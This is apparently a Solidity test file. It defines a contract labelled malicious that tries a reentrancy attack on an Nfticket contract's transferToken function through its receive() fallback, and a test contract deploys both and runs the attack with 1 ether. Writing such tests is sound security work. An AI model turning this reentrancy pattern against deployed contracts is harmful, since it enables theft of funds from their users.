pragma solidity ^0.8.20;
import "./Nfticket.sol";

// Malicious contract attempting reentrancy
contract MaliciousContract {
    Nfticket public nfticket;

    constructor(address _nfticketAddress) {
        nfticket = Nfticket(_nfticketAddress);
    }

    // Fallback function used to perform the reentrancy attack
    receive() external payable {
        // Attempt to re-enter the transferToken function
        nfticket.transferToken(payable(address(this)), 1);
    }

    function attack() external payable {
        // Initial call to transferToken to start the attack
        nfticket.transferToken{value: msg.value}(payable(address(this)), 1);
    }
}

// Test contract
contract ReentrancyTest {
    Nfticket public nfticket;
    MaliciousContract public attacker;

    function beforeEach() public {
        // Deploy the Nfticket contract
        nfticket = new Nfticket(address(this));
        // Deploy the malicious contract
        attacker = new MaliciousContract(address(nfticket));
    }

    function testReentrancyAttack() public {
        attacker.attack{value: 1 ether}();
    }
}